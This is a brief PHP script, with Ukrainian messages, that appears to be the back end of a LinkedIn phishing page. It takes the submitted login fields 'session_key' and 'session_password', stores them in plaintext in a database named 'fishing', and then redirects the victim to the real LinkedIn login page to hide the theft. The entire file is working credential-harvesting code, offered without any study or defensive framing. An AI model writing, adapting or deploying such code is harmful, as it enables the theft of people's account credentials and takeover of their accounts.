<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "fishing";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Помилка підключення: " . $conn->connect_error);
}

if (isset($_POST['session_key']) && isset($_POST['session_password'])) {
    $session_key = $conn->real_escape_string($_POST['session_key']);
    $session_password = $conn->real_escape_string($_POST['session_password']);

    $sql = "INSERT INTO users_data (login, password) VALUES ('$session_key', '$session_password')";

    if ($conn->query($sql) === TRUE) {
        header("Location: https://www.linkedin.com/login/uk?fromSignIn=true&trk=guest_homepage-basic_nav-header-signin");
        exit;
    } else {
        echo "Помилка: " . $sql . "<br>" . $conn->error;
    }
} else {
    echo "Необхідно заповнити всі поля форми.";
}

$conn->close();
?>
